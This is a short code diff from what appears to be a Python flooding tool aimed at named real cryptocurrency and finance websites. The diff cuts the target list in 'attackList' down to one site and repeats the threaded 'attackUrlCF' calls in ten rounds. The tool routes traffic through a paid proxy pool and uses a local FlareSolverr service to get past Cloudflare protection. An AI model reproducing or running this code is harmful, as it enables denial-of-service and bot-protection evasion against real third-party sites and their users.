@@ -17,11 +17,6 @@ PROXY_URL_BASE = 'http://'+PROXY_USER+':'+PROXY_PASS+'@all.dc.smartproxy.com:POR
 
 attackList = [
 'https://coinspot.nl/fr',
-'https://actufinance.fr',
-'https://kryptoszene.de',
-'https://www.finaria.it',
-'https://tradingplatforms.com',
-'https://cryptonaute.fr',
 ]
 
 def checkIp(proxies):
@@ -128,9 +123,10 @@ def attackAll():
 
 flareSolverUrl = 'http://localhost:8191/v1'
 
-for url in attackList:
-	Thread(target=attackUrlCF, args=[url]).start()
-	time.sleep(10)
+for i in range(10):
+	for url in attackList:
+		Thread(target=attackUrlCF, args=[url]).start()
+		time.sleep(10)
 input()
 
 
